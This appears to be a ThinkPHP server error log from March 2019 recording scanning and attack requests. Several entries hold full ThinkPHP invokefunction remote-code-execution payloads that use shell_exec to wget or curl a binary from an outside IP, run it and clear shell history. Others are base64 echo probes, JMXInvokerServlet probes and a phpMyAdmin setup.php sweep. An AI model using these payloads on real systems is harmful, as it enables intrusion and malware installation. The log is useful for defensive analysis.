[ 2019-03-04T00:35:08+08:00 ] 98.142.213.15 /invoker/JMXInvokerServlet
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
ERR: 无法加载模块:Invoker

[ 2019-03-04T01:01:51+08:00 ] 198.211.113.151 /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://159.203.187.49/Exploit/scan.x86;cat%20scan.x86%20%3E%20Mira01;chmod%20777%20Mira01;./Mira01%20kwari.php;%20rm%20rf%20Mira01%20scan.x86;%20history%20-c
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
ERR: 无法加载模块:Index

[ 2019-03-04T01:01:51+08:00 ] 198.211.113.151 /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;curl%20-O%20http://159.203.187.49/Exploit/scan.x86;cat%20scan.x86%20%3E%20Mira01;chmod%20777%20Mira01;./Mira01%20kwari.php;%20rm%20rf%20Mira01%20scan.x86;%20history%20-c
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000096s ]
ERR: 无法加载模块:Index

[ 2019-03-04T01:09:07+08:00 ] 195.140.213.152 /invoker/JMXInvokerServlet
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: 无法加载模块:Invoker

[ 2019-03-04T03:22:08+08:00 ] 106.11.156.170 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000076s ]
ERR: 无法加载模块:Robots

[ 2019-03-04T03:22:09+08:00 ] 180.104.184.85 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
ERR: 无法加载模块:Robots

[ 2019-03-04T03:22:10+08:00 ] 61.166.216.87 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: 无法加载模块:Robots

[ 2019-03-04T03:22:11+08:00 ] 180.116.183.182 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
ERR: 无法加载模块:Robots

[ 2019-03-04T03:35:52+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]
ERR: 无法加载模块:Cache

[ 2019-03-04T05:37:55+08:00 ] 198.211.113.151 /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://159.203.187.49/Exploit/scan.x86;cat%20scan.x86%20%3E%20Mira01;chmod%20777%20Mira01;./Mira01%20kwari.php;%20rm%20rf%20Mira01%20scan.x86;%20history%20-c
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: 无法加载模块:Index

[ 2019-03-04T05:37:56+08:00 ] 198.211.113.151 /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;curl%20-O%20http://159.203.187.49/Exploit/scan.x86;cat%20scan.x86%20%3E%20Mira01;chmod%20777%20Mira01;./Mira01%20kwari.php;%20rm%20rf%20Mira01%20scan.x86;%20history%20-c
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:Index

[ 2019-03-04T06:11:12+08:00 ] 14.17.21.58 /invoker/JMXInvokerServlet
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
ERR: 无法加载模块:Invoker

[ 2019-03-04T10:01:54+08:00 ] 106.120.188.158 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
ERR: 无法加载模块:Robots

[ 2019-03-04T10:09:03+08:00 ] 106.38.241.126 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: 无法加载模块:Robots

[ 2019-03-04T12:09:32+08:00 ] 123.126.113.129 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000077s ]
ERR: 无法加载模块:Robots

[ 2019-03-04T13:42:47+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]
ERR: 无法加载模块:Cache

[ 2019-03-04T15:18:38+08:00 ] 118.221.122.8 /phpmyadmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
ERR: 无法加载模块:Phpmyadmin

[ 2019-03-04T19:42:04+08:00 ] 139.180.212.18 /?s=index/%09hink%07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=echo%20cG9uaWVzCg==%20%7C%20base64%20-d
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:Index

[ 2019-03-04T19:42:04+08:00 ] 139.180.212.18 /?s=index/%09hink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=echo%20cG9uaWVzCg==%20%7C%20base64%20-d
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: 无法加载模块:Index

[ 2019-03-04T19:42:04+08:00 ] 139.180.212.18 /invoker/JMXInvokerServlet
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
ERR: 无法加载模块:Invoker

[ 2019-03-04T20:54:27+08:00 ] 212.237.0.99 /2phpmyadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: 无法加载模块:2phpmyadmin

[ 2019-03-04T20:54:27+08:00 ] 212.237.0.99 /MyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]
ERR: 无法加载模块:MyAdmin

[ 2019-03-04T20:54:28+08:00 ] 212.237.0.99 /PHPMYADMIN/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:PHPMYADMIN

[ 2019-03-04T20:54:28+08:00 ] 212.237.0.99 /PMA2011/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: 无法加载模块:PMA2011

[ 2019-03-04T20:54:29+08:00 ] 212.237.0.99 /PMA2012/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000072s ]
ERR: 无法加载模块:PMA2012

[ 2019-03-04T20:54:29+08:00 ] 212.237.0.99 /SQL/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: 无法加载模块:SQL

[ 2019-03-04T20:54:30+08:00 ] 212.237.0.99 /_PHPMYADMIN/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
ERR: 无法加载模块:_PHPMYADMIN

[ 2019-03-04T20:54:30+08:00 ] 212.237.0.99 /_pHpMyAdMiN/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:_pHpMyAdMiN

[ 2019-03-04T20:54:31+08:00 ] 212.237.0.99 /_phpMyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000072s ]
ERR: 无法加载模块:_phpMyAdmin

[ 2019-03-04T20:54:31+08:00 ] 212.237.0.99 /_phpmyadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: 无法加载模块:_phpmyadmin

[ 2019-03-04T20:54:32+08:00 ] 212.237.0.99 /database/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000092s ]
ERR: 无法加载模块:Database

[ 2019-03-04T20:54:32+08:00 ] 212.237.0.99 /db/phpmyadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000085s ]
ERR: 无法加载模块:Db

[ 2019-03-04T20:54:33+08:00 ] 212.237.0.99 /db/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: 无法加载模块:Db

[ 2019-03-04T20:54:34+08:00 ] 212.237.0.99 /dbadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:Dbadmin

[ 2019-03-04T20:54:34+08:00 ] 212.237.0.99 /my/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: 无法加载模块:My

[ 2019-03-04T20:54:34+08:00 ] 212.237.0.99 /myadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
ERR: 无法加载模块:Myadmin

[ 2019-03-04T20:54:36+08:00 ] 212.237.0.99 /mysql/admin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000090s ]
ERR: 无法加载模块:Mysql

[ 2019-03-04T20:54:36+08:00 ] 212.237.0.99 /mysql/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:Mysql

[ 2019-03-04T20:54:37+08:00 ] 212.237.0.99 /mysqladmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:Mysqladmin

[ 2019-03-04T20:54:37+08:00 ] 212.237.0.99 /p/m/a/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: 无法加载模块:P

[ 2019-03-04T20:54:38+08:00 ] 212.237.0.99 /pHpMyAdMiN/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000104s ]
ERR: 无法加载模块:PHpMyAdMiN

[ 2019-03-04T20:54:39+08:00 ] 212.237.0.99 /phpAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: 无法加载模块:PhpAdmin

[ 2019-03-04T20:54:39+08:00 ] 212.237.0.99 /phpLDAPadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:PhpLDAPadmin

[ 2019-03-04T20:54:40+08:00 ] 212.237.0.99 /phpMyAdmi/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: 无法加载模块:PhpMyAdmi

[ 2019-03-04T20:54:40+08:00 ] 212.237.0.99 /phpMyAdmin-2.5.5/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:PhpMyAdmin-2.5.5

[ 2019-03-04T20:54:41+08:00 ] 212.237.0.99 /phpMyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000088s ]
ERR: 无法加载模块:PhpMyAdmin

[ 2019-03-04T20:54:41+08:00 ] 212.237.0.99 /phpMyAds/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
ERR: 无法加载模块:PhpMyAds

[ 2019-03-04T20:54:42+08:00 ] 212.237.0.99 /phpadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: 无法加载模块:Phpadmin

[ 2019-03-04T20:54:42+08:00 ] 212.237.0.99 /phpmy-admin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000028s ]
INFO: [ app_init ] --END-- [ RunTime:0.000103s ]
ERR: 无法加载模块:Phpmy-admin

[ 2019-03-04T20:54:42+08:00 ] 212.237.0.99 /phpmyadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:Phpmyadmin

[ 2019-03-04T20:54:43+08:00 ] 212.237.0.99 /phpmyadmin1/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000031s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: 无法加载模块:Phpmyadmin1

[ 2019-03-04T20:54:43+08:00 ] 212.237.0.99 /phpmyadmin2/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:Phpmyadmin2

[ 2019-03-04T20:54:44+08:00 ] 212.237.0.99 /phpmyadmin2011/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: 无法加载模块:Phpmyadmin2011

[ 2019-03-04T20:54:45+08:00 ] 212.237.0.99 /phpmyadmin3/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000095s ]
ERR: 无法加载模块:Phpmyadmin3

[ 2019-03-04T20:54:45+08:00 ] 212.237.0.99 /phpmyadmin4/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:Phpmyadmin4

[ 2019-03-04T20:54:46+08:00 ] 212.237.0.99 /phppgadmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: 无法加载模块:Phppgadmin

[ 2019-03-04T20:54:46+08:00 ] 212.237.0.99 /phpmyadmin/setup/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000068s ]
ERR: 无法加载模块:Phpmyadmin

[ 2019-03-04T20:54:47+08:00 ] 212.237.0.99 /phppma/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000099s ]
ERR: 无法加载模块:Phppma

[ 2019-03-04T20:54:47+08:00 ] 212.237.0.99 /pma/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: 无法加载模块:Pma

[ 2019-03-04T20:54:48+08:00 ] 212.237.0.99 /pma2011/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: 无法加载模块:Pma2011

[ 2019-03-04T20:54:48+08:00 ] 212.237.0.99 /pma2012/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: 无法加载模块:Pma2012

[ 2019-03-04T20:54:49+08:00 ] 212.237.0.99 /scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: 无法加载模块:Scripts

[ 2019-03-04T20:54:49+08:00 ] 212.237.0.99 /setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: 无法加载模块:Setup

[ 2019-03-04T20:54:50+08:00 ] 212.237.0.99 /sqladm/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000085s ]
ERR: 无法加载模块:Sqladm

[ 2019-03-04T20:54:51+08:00 ] 212.237.0.99 /sqladmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]
ERR: 无法加载模块:Sqladmin

[ 2019-03-04T20:54:52+08:00 ] 212.237.0.99 /sqlweb/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: 无法加载模块:Sqlweb

[ 2019-03-04T20:54:52+08:00 ] 212.237.0.99 /~/phpmanager/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: 无法加载模块:~

[ 2019-03-04T20:54:53+08:00 ] 212.237.0.99 /phpMyAdmin-2.10.0/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]
ERR: 无法加载模块:PhpMyAdmin-2.10.0

[ 2019-03-04T20:54:54+08:00 ] 212.237.0.99 /phpMyAdmin-2.11.1-all-languages/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: 无法加载模块:PhpMyAdmin-2.11.1-all-languages

[ 2019-03-04T22:26:29+08:00 ] 101.91.62.11 /TP/public/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
ERR: 无法加载模块:TP

